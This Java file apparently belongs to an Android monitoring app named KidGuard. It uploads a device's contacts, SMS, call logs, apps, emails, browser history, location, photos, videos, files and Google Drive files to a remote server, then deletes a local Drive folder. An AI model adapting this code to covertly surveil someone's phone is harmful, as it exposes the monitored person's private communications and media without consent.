package com.kidguard.services;


import android.net.Uri;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.util.Log;

import com.kidguard.MyAppApplication;
import com.kidguard.interfaces.Constant;
import com.kidguard.interfaces.RestClient;
import com.kidguard.model.Files;
import com.kidguard.model.GoogleDrive;
import com.kidguard.model.Images;
import com.kidguard.model.Video;
import com.kidguard.pojo.ApiResponsePOJO;
import com.kidguard.preference.Preference;
import com.kidguard.utilities.ApiClient;
import com.kidguard.utilities.Utilities;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

@SuppressWarnings("all")
public class RestClientService implements Constant {

    private static final String TAG = RestClientService.class.getSimpleName();
    private int j = 0;

    // Constructor For Contacts, Calls, Sms, Apps, Emails
    public RestClientService(@NonNull String tag, @NonNull String token, @NonNull String data) {
        RestClient restClientAPI = new ApiClient(tag).getClient();

        if (tag.equals(TAG_CONTACTS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendContactsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "CONTACT_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "CONTACT_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "CONTACT_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With ContactPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_SMS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendSmsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "SMS_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "SMS_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "SMS_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With SmsPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_CALLS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendCallsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "CALL_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "CALL_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "CALL_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With CALLPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_LIST_APPS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendAppsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "APP_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "APP_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "APP_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With APPPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_EMAIL)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendEmailsToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "EMAIL_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "EMAIL_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "EMAIL_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With EMAILPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_BROWSER_HISTORY)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendBrowserHistoryToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "BrowserHistory_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "BrowserHistory_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "BrowserHistory_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With BrowserHistoryPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_LOCATION)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendLocationToServer(token, data);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "Location_TRUE??" + apiResponsePOJO.getStatus());

                        } else {

                            Log.e(TAG, "Location_FALSE??" + apiResponsePOJO.getStatus());

                        }
                    } else {
                        Log.e(TAG, "Location_FAILED_CODE_ERROR??" + code);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With LocationPOJO>>>" + t.getMessage());
                }
            };
            call.enqueue(callback);
        }

        if (tag.equals(TAG_SYNC_PROCESS)) {
            Call<ApiResponsePOJO> call = restClientAPI.sendSyncProcess(token);
            Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
                @Override
                public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                    ApiResponsePOJO apiResponsePOJO = response.body();

                    int code = response.code();
                    if (code == RESPONSE_CODE) {
                        if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                            Log.e(TAG, "SyncProcess_TRUE??" + apiResponsePOJO.getStatus());
                            Preference.setMacAddress(MyAppApplication.getInstance(), null);

                        } else {

                            Log.e(TAG, "SyncProcess_FALSE??" + apiResponsePOJO.getStatus());
                            Preference.setMacAddress(MyAppApplication.getInstance(), null);

                        }
                    } else {
                        Log.e(TAG, "SyncProcess_FAILED_CODE_ERROR??" + code);
                        Preference.setMacAddress(MyAppApplication.getInstance(), null);
                    }
                }

                @Override
                public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                    Log.e(TAG, "<<<Failure With SyncProcessPOJO>>>" + t.getMessage());
                    Preference.setMacAddress(MyAppApplication.getInstance(), null);
                }
            };
            call.enqueue(callback);
        }
    }

    // Constructor For Images, Videos, Files, Drive
    public <T> RestClientService(@NonNull String tag, @NonNull String token,
                                 @NonNull Collection<T> lst) {

        RestClient restClientAPI = new ApiClient(tag).getClient();

        if (tag.equals(TAG_IMAGES)) {
            ArrayList<Images> lstImages = (ArrayList<Images>) lst;

            if (lstImages != null && lstImages.size() > 0) {

                sendImage(j, lstImages, restClientAPI, token);
            }
        }

        if (tag.equals(TAG_VIDEOS)) {
            ArrayList<Video> lstVideo = (ArrayList<Video>) lst;

            if (lstVideo != null && lstVideo.size() > 0) {

                sendVideo(j, lstVideo, restClientAPI, token);
            }
        }

        if (tag.equals(TAG_FILES)) {
            ArrayList<Files> lstFile = (ArrayList<Files>) lst;

            if (lstFile != null && lstFile.size() > 0) {

                sendFiles(j, lstFile, restClientAPI, token);
            }
        }

        if (tag.equals(TAG_GOOGLE_DRIVE)) {
            ArrayList<GoogleDrive> lstGoogleDrive = (ArrayList<GoogleDrive>) lst;

            if (lstGoogleDrive != null && lstGoogleDrive.size() > 0) {

                sendGoogleDrive(j, lstGoogleDrive, restClientAPI, token);
            }
        }
    }

    /* sendImage */
    private void sendImage(final int i, final ArrayList<Images> lstImages, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("image", new File(lstImages.get(i).getImagePath()));

        // create a map of data to pass along
        RequestBody imageName = createPartFromString(lstImages.get(i).getImageName());
        RequestBody imageSizeMB = createPartFromString(lstImages.get(i).getSizeMB());
        RequestBody imageSizeKB = createPartFromString(lstImages.get(i).getSizeKB());
        RequestBody imageDateTime = createPartFromString(lstImages.get(i).getDateTime());
        RequestBody imageDateTimeStamp = createPartFromString(lstImages.get(i).getDateTimeStamp());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("imageName", imageName);
        map.put("imageSizeMB", imageSizeMB);
        map.put("imageSizeKB", imageSizeKB);
        map.put("imageDateTime", imageDateTime);
        map.put("imageDateTimeStamp", imageDateTimeStamp);

        // finally, execute the request
        Call<ApiResponsePOJO> call = restClientAPI.sendImageToServer(token, map, body);
        Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
            @Override
            public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                ApiResponsePOJO apiResponsePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {
                    if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                        Log.e(TAG, "IMAGE_TRUE??" + apiResponsePOJO.getStatus());
                        setNextImage(i, lstImages, token);

                    } else {

                        Log.e(TAG, "IMAGE_FALSE??" + apiResponsePOJO.getStatus());
                        setNextImage(i, lstImages, token);
                    }

                } else {
                    Log.e(TAG, "IMAGE_FAILED_CODE_ERROR??" + code);
                    setNextImage(i, lstImages, token);
                }
            }

            @Override
            public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With IMAGEPOJO>>>" + t.getMessage());
                setNextImage(i, lstImages, token);
            }
        };

        call.enqueue(callback);
    }

    /* Set Next Image */
    private void setNextImage(int i, ArrayList<Images> lstImages, final String token) {
        if (i == 0) {

            j++;

        } else {

            j++;

        }

        if (lstImages.size() != j) {
            RestClient restClientAPI = new ApiClient(TAG_IMAGES).getClient();
            sendImage(j, lstImages, restClientAPI, token);
        }
    }

    /* Send Video */
    private void sendVideo(final int i, final ArrayList<Video> lstVideos, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("video", new File(lstVideos.get(i).getVideoPath()));

        // create a map of data to pass along
        RequestBody videoName = createPartFromString(lstVideos.get(i).getVideoname());
        RequestBody videoSizeKB = createPartFromString(lstVideos.get(i).getVideoSizeKB());
        RequestBody videoSizeMB = createPartFromString(lstVideos.get(i).getVideoSizeMB());
        RequestBody videoDateTime = createPartFromString(lstVideos.get(i).getDate_time());
        RequestBody videoDateTimeStamp = createPartFromString(lstVideos.get(i).getDate_time_stamp());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("videoName", videoName);
        map.put("videoSizeKB", videoSizeKB);
        map.put("videoSizeMB", videoSizeMB);
        map.put("videoDateTime", videoDateTime);
        map.put("videoDateTimeStamp", videoDateTimeStamp);

        // finally, execute the request
        Call<ApiResponsePOJO> call = restClientAPI.sendVideoToServer(token, map, body);
        Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {

            @Override
            public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                ApiResponsePOJO apiResponsePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {
                    if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                        Log.e(TAG, "Video_TRUE??" + apiResponsePOJO.getStatus());
                        setNextVideo(i, lstVideos, token);

                    } else {

                        Log.e(TAG, "Video_FALSE??" + apiResponsePOJO.getStatus());
                        setNextVideo(i, lstVideos, token);
                    }

                } else {
                    Log.e(TAG, "Video_FAILED_CODE_ERROR??" + code);
                    setNextVideo(i, lstVideos, token);
                }
            }

            @Override
            public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With VideoPOJO>>>" + t.getMessage());
                setNextVideo(i, lstVideos, token);
            }
        };

        call.enqueue(callback);
    }

    /* Set Next Video */
    private void setNextVideo(int i, ArrayList<Video> lstVideos, String token) {
        if (i == 0) {

            j++;

        } else {

            j++;

        }

        if (lstVideos.size() != j) {
            RestClient restClientAPI = new ApiClient(TAG_VIDEOS).getClient();
            sendVideo(j, lstVideos, restClientAPI, token);
        }
    }

    /* Send Files To Server */
    private void sendFiles(final int i, final ArrayList<Files> lstFiles, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("file", new File(lstFiles.get(i).getFilePath()));

        // create a map of data to pass along
        RequestBody fileName = createPartFromString(lstFiles.get(i).getFilename());
        RequestBody fileSizeKB = createPartFromString(lstFiles.get(i).getFileSizeKB());
        RequestBody fileSizeMB = createPartFromString(lstFiles.get(i).getFileSizeMB());
        RequestBody fileDateTime = createPartFromString(lstFiles.get(i).getDate_time());
        RequestBody fileDateTimeStamp = createPartFromString(lstFiles.get(i).getDate_time_stamp());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("fileName", fileName);
        map.put("fileSizeKB", fileSizeKB);
        map.put("fileSizeMB", fileSizeMB);
        map.put("fileDateTime", fileDateTime);
        map.put("fileDateTimeStamp", fileDateTimeStamp);

        // finally, execute the request
        Call<ApiResponsePOJO> call = restClientAPI.sendFilesToServer(token, map, body);
        Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
            @Override
            public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                ApiResponsePOJO apiResponsePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {

                    if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {
                        Log.e(TAG, "Files_TRUE??" + apiResponsePOJO.getStatus());
                        setNextFiles(i, lstFiles, token);

                    } else {

                        Log.e(TAG, "Files_FALSE??" + apiResponsePOJO.getStatus());
                        setNextFiles(i, lstFiles, token);
                    }

                } else {
                    Log.e(TAG, "Files_FAILED_CODE_ERROR??" + code);
                    setNextFiles(i, lstFiles, token);
                }
            }

            @Override
            public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With FilePOJO>>>" + t.getMessage());
                setNextFiles(i, lstFiles, token);
            }
        };

        call.enqueue(callback);
    }

    /* Set Next Files */
    private void setNextFiles(int i, ArrayList<Files> lstFiles, String token) {
        if (i == 0) {

            j++;

        } else {

            j++;

        }

        if (lstFiles.size() != j) {
            RestClient restClientAPI = new ApiClient(TAG_FILES).getClient();
            sendFiles(j, lstFiles, restClientAPI, token);
        }
    }

    /* Send Google Drive To Server */
    private void sendGoogleDrive(final int i, final ArrayList<GoogleDrive> lstDrive, final RestClient restClientAPI, final String token) {

        // create part for file (photo, video, ...)
        MultipartBody.Part body = prepareFilePart("drive", new File(lstDrive.get(i).getFileDownloadUrl()));

        // create a map of data to pass along
        RequestBody driveFileName = createPartFromString(lstDrive.get(i).getFileTitle());
        RequestBody driveFileSize = createPartFromString(lstDrive.get(i).getFileSize());
        RequestBody driveFileDate = createPartFromString(lstDrive.get(i).getFileDate());
        RequestBody driveFileId = createPartFromString(lstDrive.get(i).getFileId());

        HashMap<String, RequestBody> map = new HashMap<>();
        map.put("driveFileId", driveFileId);
        map.put("driveFileName", driveFileName);
        map.put("driveFileSize", driveFileSize);
        map.put("driveFileDate", driveFileDate);

        // finally, execute the request
        Call<ApiResponsePOJO> call = restClientAPI.sendDriveToServer(token, map, body);
        Callback<ApiResponsePOJO> callback = new Callback<ApiResponsePOJO>() {
            @Override
            public void onResponse(Call<ApiResponsePOJO> call, Response<ApiResponsePOJO> response) {
                ApiResponsePOJO apiResponsePOJO = response.body();

                int code = response.code();
                if (code == RESPONSE_CODE) {
                    if (apiResponsePOJO.getStatus() == RESPONSE_CODE) {

                        Log.e(TAG, "Drive_TRUE??" + apiResponsePOJO.getStatus());
                        setNextDrive(i, lstDrive, token);

                    } else {

                        Log.e(TAG, "Drive_FALSE??" + apiResponsePOJO.getStatus());
                        setNextDrive(i, lstDrive, token);
                    }

                } else {
                    Log.e(TAG, "Drive_FAILED_CODE_ERROR??" + code);
                    setNextDrive(i, lstDrive, token);
                }
            }

            @Override
            public void onFailure(Call<ApiResponsePOJO> call, Throwable t) {
                Log.e(TAG, "<<<Failure With DrivePOJO>>>" + t.getMessage());
                setNextDrive(i, lstDrive, token);
            }
        };

        call.enqueue(callback);
    }

    /* Set Next Drive */
    private void setNextDrive(int i, ArrayList<GoogleDrive> lstDrive, String token) {
        if (i == 0) {

            j++;

        } else {

            j++;

        }

        if (lstDrive.size() != j) {
            RestClient restClientAPI = new ApiClient(TAG_GOOGLE_DRIVE).getClient();
            sendGoogleDrive(j, lstDrive, restClientAPI, token);
        } else {
            deleteDriveFolder();
        }
    }

    @NonNull
    private RequestBody createPartFromString(String descriptionString) {
        return RequestBody.create(MediaType.parse(MULTIPART_FORM_DATA), descriptionString);
    }

    @NonNull
    private MultipartBody.Part prepareFilePart(String partName, File file) {
        // https://github.com/iPaulPro/aFileChooser/blob/master/aFileChooser/src/com/ipaulpro/afilechooser/utils/FileUtils.java
        RequestBody requestFile = RequestBody.create(MediaType.parse(MULTIPART_FORM_DATA), file);

        // MultipartBody.Part is used to send also the actual file name
        return MultipartBody.Part.createFormData(partName, file.getName(), requestFile);
    }

    /* Delete Drive Folder */
    private void deleteDriveFolder() {
       /* Check and Delete And Refresh Gallery Google Drive Foolder in SdCard */
        File path = new java.io.File(Environment.getExternalStorageDirectory().toString()
                + java.io.File.separator + DRIVE_NAME);
        Utilities.deleteDirectory(path);
        Utilities.refreshAndroidGallery(MyAppApplication.getInstance(), Uri.fromFile(path));
    }
}